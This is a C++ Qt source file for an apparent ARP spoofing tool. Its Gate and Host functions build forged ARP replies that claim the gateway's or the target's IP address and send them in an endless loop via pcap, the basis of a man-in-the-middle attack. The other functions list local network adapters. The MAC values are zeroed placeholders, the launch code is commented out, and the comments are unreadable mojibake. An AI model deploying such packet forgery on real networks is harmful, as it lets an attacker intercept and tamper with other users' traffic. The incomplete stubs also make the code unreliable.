#include "ArpWork.h"

ArpWork::ArpWork(QWidget* parent)
    : QMainWindow(parent)
{
    ui.setupUi(this);
}

ArpWork::~ArpWork()
{}

using namespace std;


int Gate(pcap_t* adhandle , string TargetHostIP, string GateIP, u_char TargetHostMAC[6], u_char HostMAC[6])
{
    //α��ARP Relpy��
    //Ŀ����Ϣ
    string DstIP = TargetHostIP;
    u_char DstMAC[6] = { 0,0,0,0,0,0 }; //TargetHostMAC;
    //Դ��Ϣ
    string SrcIP = GateIP;
    u_char SrcMAC[6] = { 0,0,0,0,0,0 }; //HostMAC;   //��MAC��ַ��������MAC��

    eth_head eh;        //��̫��ͷ
    arp_head ah;        //ARPͷ

    for (int i = 0; i < 6; i++)
        eh.destMAC.byte[i] = DstMAC[i];
    for (int i = 0; i < 6; i++)
        eh.sourceMAC.byte[i] = SrcMAC[i];
    eh.type = htons(0x0806);        //ARP����

    ah.hardwareType = htons(0x0001);
    ah.protocolType = htons(0x0800);
    ah.hardwareAddLen = 0x06;
    ah.protocolAddLen = 0x04;
    ah.op = htons(0x0002);
    ah.sourceMAC = eh.sourceMAC;
    ah.sourceIP = inet_addr(SrcIP.c_str());
    ah.destMAC = eh.destMAC;
    ah.destIP = inet_addr(DstIP.c_str());

    arp_packet* apt = NULL;
    unsigned char sendbuffer[80];
    memset(sendbuffer, 0, sizeof(sendbuffer));
    apt = (arp_packet*)sendbuffer;
    apt->apt_eth_head = eh;
    apt->apt_arp_head = ah;

    while (true)
    {
        if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
        {
            return -1;
        }
        Sleep(100);
    }
    return 0;
}

int Host(pcap_t* adhandle, string TargetHostIP, string GateIP, u_char HostMAC[6], u_char GateMAC[6])
{
    //α��ARP Relpy��
    //Ŀ����Ϣ
    string DstIP = GateIP;
    u_char DstMAC[6] = { 0,0,0,0,0,0 }; //GateMAC[6];
    //Դ��Ϣ
    string SrcIP = TargetHostIP;
    u_char SrcMAC[6] = { 0,0,0,0,0,0 }; //HostMAC[6];   //��MAC��ַ��������MAC��

    eth_head eh;        //��̫��ͷ
    arp_head ah;        //ARPͷ

    for (int i = 0; i < 6; i++)
        eh.destMAC.byte[i] = DstMAC[i];
    for (int i = 0; i < 6; i++)
        eh.sourceMAC.byte[i] = SrcMAC[i];
    eh.type = htons(0x0806);        //ARP����

    ah.hardwareType = htons(0x0001);
    ah.protocolType = htons(0x0800);
    ah.hardwareAddLen = 0x06;
    ah.protocolAddLen = 0x04;
    ah.op = htons(0x0002);
    ah.sourceMAC = eh.sourceMAC;
    ah.sourceIP = inet_addr(SrcIP.c_str());
    ah.destMAC = eh.destMAC;
    ah.destIP = inet_addr(DstIP.c_str());

    arp_packet* apt = NULL;
    unsigned char sendbuffer[80];
    memset(sendbuffer, 0, sizeof(sendbuffer));
    apt = (arp_packet*)sendbuffer;
    apt->apt_eth_head = eh;
    apt->apt_arp_head = ah;

    while (true)
    {
        if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
        {
            return -1;
        }
        Sleep(100);
    }
    return 0;
}

void ArpWork::send()
{
    /*pcap_if_t* alldevs;
    pcap_if_t* d;
    char* tam = (char*)"rpcap://";
    char errbuf[PCAP_ERRBUF_SIZE];
    //��ȡ�豸�б�
    if (pcap_findalldevs_ex(tam, NULL, &alldevs, errbuf) == -1)
    {
        return;
    }
    int i = 0;

    for (d = alldevs; d != NULL; d = d->next)
    {
         i++;
    }

    if (i == 0)
    {
        return;
    }

    while (true)
    {
        QString number = ui.lineEdit_3->text();
        int n = number.toInt();

        if (n < 0 || n >= i)
        {
            pcap_freealldevs(alldevs);
            return ;
        }
        for (d = alldevs, i = 0; i < n+1; d = d->next, i++);
        break;
    }

    //���������������󶨵��豸
    pcap_t* adhandle;

    if ((adhandle = pcap_open(d->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf)) == NULL)
    {
        pcap_freealldevs(alldevs);
        return;
    }
    pcap_freealldevs(alldevs);*/
    ui.lineEdit->setText("1008611");
    //����ģʽ
   // Gate(adhandle);
   // Host(adhandle);
}

void ArpWork::gethost() {
    //PIP_ADAPTER_INFO�ṹ��ָ��洢����������Ϣ
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    //�õ��ṹ���С,����GetAdaptersInfo����
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    //����GetAdaptersInfo����,���pIpAdapterInfoָ�����;����stSize��������һ��������Ҳ��һ�������
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    //��¼��������
    int netCardNum = 0;
    //��¼ÿ�������ϵ�IP��ַ����
    int IPnumPerNetCard = 0;
    if (ERROR_BUFFER_OVERFLOW == nRel) {
        //����������ص���ERROR_BUFFER_OVERFLOW
        //��˵��GetAdaptersInfo�������ݵ��ڴ�ռ䲻��,ͬʱ�䴫��stSize,��ʾ��Ҫ�Ŀռ��С
        //��Ҳ��˵��ΪʲôstSize����һ��������Ҳ��һ�������
        //�ͷ�ԭ�����ڴ�ռ�
        delete pIpAdapterInfo;
        //���������ڴ�ռ������洢����������Ϣ
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        //�ٴε���GetAdaptersInfo����,���pIpAdapterInfoָ�����
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }
    if (ERROR_SUCCESS == nRel) {
        //���������Ϣ
         //�����ж�����,���ͨ��ѭ��ȥ�ж�
        QString NetName, NetIP, NetMAC;
        while (pIpAdapterInfo) {

            netCardNum++;
            
            string count;
            stringstream sstr;
            sstr << netCardNum;
            count = sstr.str();

            NetName += "Net";
            NetName += count;
            NetName += " ";
            NetName += pIpAdapterInfo->Description;
            NetName += "\n";

            ui.plainTextEdit->setPlainText(NetName);

            char mac[128];
            sprintf_s(mac, 18, "%02X-%02X-%02X-%02X-%02X-%02X",
                pIpAdapterInfo->Address[0],
                pIpAdapterInfo->Address[1],
                pIpAdapterInfo->Address[2],
                pIpAdapterInfo->Address[3],
                pIpAdapterInfo->Address[4],
                pIpAdapterInfo->Address[5]
            );
            NetMAC += "MAC ";
            NetMAC += mac;
            NetMAC += "\n";

            ui.plainTextEdit_2->setPlainText(NetMAC);

            //���������ж�IP,���ͨ��ѭ��ȥ�ж�
            IP_ADDR_STRING* pIpAddrString = &(pIpAdapterInfo->IpAddressList);
            NetIP += "IP ";
            NetIP += pIpAddrString->IpAddress.String;
            NetIP += "\n";

            ui.plainTextEdit_3->setPlainText(NetIP);

            //do {
            //    cout << "IP ��" << pIpAddrString->IpAddress.String << endl;
           //     pIpAddrString = pIpAddrString->Next;
           // } while (pIpAddrString);

            pIpAdapterInfo = pIpAdapterInfo->Next;
        }
    }
    //�ͷ��ڴ�ռ�
    if (pIpAdapterInfo) {
        delete pIpAdapterInfo;
        pIpAdapterInfo = NULL;
    }
}

void ArpWork::getIP(){
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
     
    if (ERROR_BUFFER_OVERFLOW == nRel) {
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }
    if (ERROR_SUCCESS == nRel) {
        QString IP;
        QString number = ui.lineEdit_3->text();
        int n = number.toInt();
        

        for (int i = 1; i < n; i++)
        {
            pIpAdapterInfo = pIpAdapterInfo->Next;
        }

        IP_ADDR_STRING* pIpAddrString = &(pIpAdapterInfo->IpAddressList);

        IP += pIpAdapterInfo->Description;
        IP += "\n";

        do {
            IP += "IP ";
            IP += pIpAddrString->IpAddress.String;
            IP += "\n";
            pIpAddrString = pIpAddrString->Next;

        } while (pIpAddrString);

        ui.plainTextEdit_4->setPlainText(IP);
    }
}

void ArpWork::stop()
{
    ui.lineEdit_5->setText("##");
    ui.lineEdit_3->setText("100221");
}
